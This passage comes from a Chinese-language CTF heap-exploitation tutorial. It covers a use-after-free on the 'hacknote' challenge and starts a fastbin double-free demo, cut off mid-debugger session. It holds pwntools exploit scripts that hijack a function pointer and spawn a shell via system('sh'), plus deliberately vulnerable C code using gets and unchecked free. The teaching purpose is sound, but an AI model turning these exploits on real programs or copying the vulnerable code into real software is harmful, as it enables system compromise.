0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>删除之后可以再次来看堆的信息可以看到大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x804b150</span></span><br><span class="line">0x804b150:    0x0000000000000000	0x0000001100000000</span><br><span class="line">0x804b160:	0x0804b17000000000	0x0000002100000000</span><br><span class="line">0x804b170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x804b180:	0x0000000000000000	0x0000001100000000</span><br><span class="line">0x804b190:	0x0804b1a00804b160	0x0000002100000000</span><br><span class="line">0x804b1a0:	0x0000000a0804b170	0x0000000000000000</span><br><span class="line">0x804b1b0:	0x0000000000000000	0x00021e4900000000</span><br><span class="line">0x804b1c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x804b1d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x804b1e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>我们重新申请大小为8,内容为aaaa的note再打印note0就会改变eip</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">Index :0</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x61616161 in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> EAX  0x61616161 ('aaaa')</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0x0</span><br><span class="line"> EDX  0x804b160 ◂— 0x61616161 ('aaaa')</span><br><span class="line"> EDI  0x0</span><br><span class="line"> ESI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c</span><br><span class="line"> EBP  0xffffd188 —▸ 0xffffd1a8 ◂— 0x0</span><br><span class="line"> ESP  0xffffd15c —▸ 0x804896f (print_note+154) ◂— add    esp, 0x10</span><br><span class="line"> EIP  0x61616161 ('aaaa')</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">Invalid address 0x61616161</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd15c —▸ 0x804896f (print_note+154) ◂— add    esp, 0x10</span><br><span class="line">01:0004│      0xffffd160 —▸ 0x804b160 ◂— 0x61616161 ('aaaa')</span><br><span class="line">02:0008│      0xffffd164 —▸ 0xffffd178 —▸ 0xf7fa0a30 ◂— add    dword ptr [edx + 0xe], eax</span><br><span class="line">03:000c│      0xffffd168 ◂— 0x4</span><br><span class="line">04:0010│      0xffffd16c —▸ 0x8048a32 (menu+147) ◂— add    esp, 0x10</span><br><span class="line">05:0014│      0xffffd170 —▸ 0x8048c63 ◂— pop    ecx /* 'Your choice :' */</span><br><span class="line">06:0018│      0xffffd174 ◂— 0x0</span><br><span class="line">07:001c│      0xffffd178 —▸ 0xf7fa0a30 ◂— add    dword ptr [edx + 0xe], eax</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0 61616161</span><br><span class="line">   f 1  804896f print_note+154</span><br><span class="line">   f 2  8048ad3 main+155</span><br><span class="line">   f 3 f7defe81 __libc_start_main+241</span><br><span class="line">Program received signal SIGSEGV (fault address 0x61616161)</span><br></pre></td></tr></table></figure>
<p>我们只需要将aaaa改为我们magic的地址即可，而magic函数的地址是在IDA中可以看到的，所以我们可以得到下面的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./hacknote'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">magic_addr = <span class="number">0x8048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">16</span>,<span class="string">"aaaa"</span>)</span><br><span class="line">addnote(<span class="number">16</span>,<span class="string">"aaaa"</span>)</span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>,p32(magic_addr))</span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>上面的exp并不能拿到shell，只能获得flag，为了拿到shell我们还需要执行system(‘/bin/sh’)，下面的版本才是getshell的exp</p>
<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./hacknote'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./hacknote'</span>)</span><br><span class="line"><span class="comment">#r = remote("",)</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">magic_addr = <span class="number">0x08048986</span></span><br><span class="line">system_addr = <span class="number">0x8048500</span>+<span class="number">6</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(size,context)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.send(<span class="string">'1'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.send(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.send(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_note</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.send(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.send(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.send(<span class="string">'3'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.send(str(index))</span><br><span class="line"></span><br><span class="line">add_note(<span class="number">20</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add_note(<span class="number">20</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">del_note(<span class="number">0</span>)</span><br><span class="line">del_note(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add_note(<span class="number">8</span>,p32(system_addr)+<span class="string">';sh;'</span>) <span class="comment"># system("address;sh;")</span></span><br><span class="line"></span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>system函数地址分布如下，+6 的原因是直接走push 0x38的位置，让程序直接去解析system函数真正的位置，也就是执行dl_runtime_resolve(link_map, index) 函数解析system函数的位置，具体原理详见 ret2dl-resolve</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10i 0x8048500</span><br><span class="line">   0x8048500 &lt;system@plt&gt;:	jmp    DWORD PTR ds:0x804a028</span><br><span class="line">   0x8048506 &lt;system@plt+6&gt;:	push   0x38</span><br><span class="line">   0x804850b &lt;system@plt+11&gt;:	jmp    0x8048480</span><br><span class="line">   0x8048510 &lt;<span class="built_in">exit</span>@plt&gt;:	jmp    DWORD PTR ds:0x804a02c</span><br><span class="line">   0x8048516 &lt;<span class="built_in">exit</span>@plt+6&gt;:	push   0x40</span><br><span class="line">   0x804851b &lt;<span class="built_in">exit</span>@plt+11&gt;:	jmp    0x8048480</span><br><span class="line">   0x8048520 &lt;__libc_start_main@plt&gt;:	jmp    DWORD PTR ds:0x804a030</span><br><span class="line">   0x8048526 &lt;__libc_start_main@plt+6&gt;:	push   0x48</span><br><span class="line">   0x804852b &lt;__libc_start_main@plt+11&gt;:	jmp    0x8048480</span><br><span class="line">   0x8048530 &lt;setvbuf@plt&gt;:	jmp    DWORD PTR ds:0x804a034</span><br></pre></td></tr></table></figure>
<h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h2><p><strong>漏洞介绍</strong></p>
<p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。</p>
<p>Fastbin Double Free 能够成功利用主要有两部分的原因</p>
<ul>
<li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li>
<li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li>
</ul>
<p>更详细的介绍<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack/#fastbin-double-free" target="_blank" rel="noopener">CTF-wiki</a>上有，我就不赘述了。下面直接来实例：</p>
<h3 id="Example-One-1"><a href="#Example-One-1" class="headerlink" title="Example One"></a>Example One</h3><p>首先创建一个heap.c，内容如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sh</span><span class="params">(<span class="keyword">char</span> *id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(id);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">int</span> cmd,idx,sz;</span><br><span class="line">	<span class="keyword">char</span> *ptr[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">memset</span>(ptr,<span class="number">0</span>,<span class="keyword">sizeof</span>(ptr));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"1.malloc+gets\n2.free\n3.puts\n"</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;cmd,&amp;idx); <span class="comment">//这里cmd是选择功能，idx是为了区分申请的第几个chunk</span></span><br><span class="line">		idx %= <span class="number">10</span>;</span><br><span class="line">		<span class="keyword">if</span>(cmd==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>,&amp;sz);</span><br><span class="line">			ptr[idx] = <span class="built_in">malloc</span>(sz);</span><br><span class="line">			gets(ptr[idx]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(cmd==<span class="number">2</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">free</span>(ptr[idx]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(cmd==<span class="number">3</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">puts</span>(ptr[idx]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> 	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie heap.c -o heap -g -w</span><br></pre></td></tr></table></figure>
<p>这道题有三个选项，一个申请，一个释放，一个打印，因为可以自己操作释放，我们分析之后发现存在Double Free的漏洞，下面就直接动态演示一下这个过程，我们断在输入的地方</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b 20</span></span><br><span class="line">Breakpoint 1 at 0x40085b: file heap.c, line 20.</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> r</span></span><br><span class="line">Starting program: /home/Thunder_J/桌面/heap </span><br><span class="line">1.malloc+gets</span><br><span class="line">2.free</span><br><span class="line">3.puts</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line">Breakpoint 1, main () at heap.c:20</span><br><span class="line">20			scanf("%d %d",&amp;cmd,&amp;idx); //这里cmd是选择功能，idx是为了区分申请的第几个chunk</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> RAX  0x2</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x7ffff7dd18c0 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> RDI  0x1</span><br><span class="line"> RSI  0x7fffffffb8e0 ◂— 0x203e /* '&gt; ' */</span><br><span class="line"> R8   0x2</span><br><span class="line"> R9   0x7ffff7fda4c0 ◂— 0x7ffff7fda4c0</span><br><span class="line"> R10  0x3</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x4006f0 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffe0e0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fffffffe000 —▸ 0x400940 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffdf80 ◂— 0x0</span><br><span class="line"> RIP  0x40085b (main+105) ◂— lea    rdx, [rbp - 0x78]</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► 0x40085b &lt;main+105&gt;    lea    rdx, [rbp - 0x78] &lt;0x7ffff7dd18c0&gt;</span><br><span class="line">   0x40085f &lt;main+109&gt;    lea    rax, [rbp - 0x7c]</span><br><span class="line">   0x400863 &lt;main+113&gt;    mov    rsi, rax</span><br><span class="line">   0x400866 &lt;main+116&gt;    lea    rdi, [rip + 0x177]</span><br><span class="line">   0x40086d &lt;main+123&gt;    mov    eax, 0</span><br><span class="line">   0x400872 &lt;main+128&gt;    call   __isoc99_scanf@plt &lt;0x4006d0&gt;</span><br><span class="line"> </span><br><span class="line">   0x400877 &lt;main+133&gt;    mov    ecx, dword ptr [rbp - 0x78]</span><br><span class="line">   0x40087a &lt;main+136&gt;    mov    edx, 0x66666667</span><br><span class="line">   0x40087f &lt;main+141&gt;    mov    eax, ecx</span><br><span class="line">   0x400881 &lt;main+143&gt;    imul   edx</span><br><span class="line">   0x400883 &lt;main+145&gt;    sar    edx, 2</span><br><span class="line">───────────────────────────────[ SOURCE (CODE) ]────────────────────────────────</span><br><span class="line">In file: /home/xsj/桌面/heap.c</span><br><span class="line">   15 	memset(ptr,0,sizeof(ptr));</span><br><span class="line">   16 	puts("1.malloc+gets\n2.free\n3.puts\n");</span><br><span class="line">   17 	while(1)</span><br><span class="line">   18 	&#123;</span><br><span class="line">   19 		printf("&gt; ");</span><br><span class="line"> ► 20 		scanf("%d %d",&amp;cmd,&amp;idx); //这里cmd是选择功能，idx是为了区分申请的第几个chunk</span><br><span class="line">   21 		idx %= 10;</span><br><span class="line">   22 		if(cmd==1)</span><br><span class="line">   23 		&#123;</span><br><span class="line">   24 			scanf("%d%*c",&amp;sz);</span><br><span class="line">   25 			ptr[idx] = malloc(sz);</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffdf80 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0           40085b main+105</span><br><span class="line">   f 1     7ffff7a05b97 __libc_start_main+231</span><br><span class="line">Breakpoint /home/Thunder_J/桌面/heap.c:20</span><br></pre></td></tr></table></figure>
<p>我们按如下方式先申请两块大小为25的内存：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> n</span></span><br><span class="line">1 0</span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">25 aaaaaaaa</span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">1 1</span><br><span class="line">25 bbbbbbbb</span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> heap <span class="comment">#find heap</span></span></span><br><span class="line">...</span><br><span class="line">0x602660 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 49, </span><br><span class="line">  fd = 0x6161616161616161, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602690 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 49, </span><br><span class="line">  fd = 0x6262626262626262, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602670-16</span></span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602670:	0x6161616161616161	0x0000000000000000	#'aaaaaaaa'</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x6262626262626262	0x0000000000000000  #'bbbbbbbb'</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>现在我们删除chunk，再次观察这里的内存</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">2 0 #free ptr[0]</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">2 1 #free ptr[1]</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash">  x/20gx 0x602670-16</span></span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602670:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x0000000000602670	0x0000000000000000</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">2 0 #free ptr[0] again</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 